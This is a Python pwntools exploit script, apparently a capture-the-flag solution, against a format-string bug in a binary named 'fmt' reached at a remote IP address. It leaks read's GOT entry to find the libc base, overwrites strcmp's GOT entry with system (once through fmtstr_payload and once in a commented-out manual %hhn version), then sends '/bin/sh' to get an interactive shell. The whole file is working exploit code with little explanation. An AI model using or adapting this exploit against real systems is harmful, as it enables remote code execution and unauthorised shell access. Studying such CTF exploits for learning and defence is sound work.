from pwn import *

context.arch = 'amd64'

e = ELF('./fmt')
libc = ELF('./libc.so.6')

#p = process('./fmt')
p = remote('192.168.200.106', 10008)

READ_OFFSET = libc.symbols['read']
SYSTEM_OFFSET = libc.symbols['system']

PAYLOAD = b'%7$sAAAA'           # <- rsp
PAYLOAD += p64(e.got['read'])   # <- rsp + 8

p.send(PAYLOAD)

READ_GOT = u64(p.recvuntil(b'AAAA', drop=True).ljust(8, b'\x00'))

BASE_ADDR = READ_GOT - READ_OFFSET
SYSTEM_GOT = BASE_ADDR + SYSTEM_OFFSET
STRCMP_GOT = e.got['strcmp']

# 6 + (72/8) == 15
'''
x = SYSTEM_GOT&0xFF
PAYLOAD  = f'%{x}c%15$hhn%{256-x}c'
x = (SYSTEM_GOT >> 8)&0xFF
PAYLOAD += f'%{x}c%16$hhn%{256-x}c'
x = (SYSTEM_GOT >> 16)&0xFF
PAYLOAD += f'%{x}c%17$hhn%{256-x}c'
x = (SYSTEM_GOT >> 24)&0xFF
PAYLOAD += f'%{x}c%18$hhn%{256-x}c'

PAYLOAD = PAYLOAD.ljust(72, 'A')

PAYLOAD = PAYLOAD.encode()
PAYLOAD += p64(STRCMP_GOT)
PAYLOAD += p64(STRCMP_GOT + 1)
PAYLOAD += p64(STRCMP_GOT + 2)
PAYLOAD += p64(STRCMP_GOT + 3)

p.sendafter(b'\n', PAYLOAD)
'''

PAYLOAD = fmtstr_payload(6, {STRCMP_GOT : SYSTEM_GOT}, 0, 'byte')

p.send(PAYLOAD)
sleep(1)
p.sendline(b'/bin/sh\x00')

p.interactive()
# flag is flag{fmtstr_payload}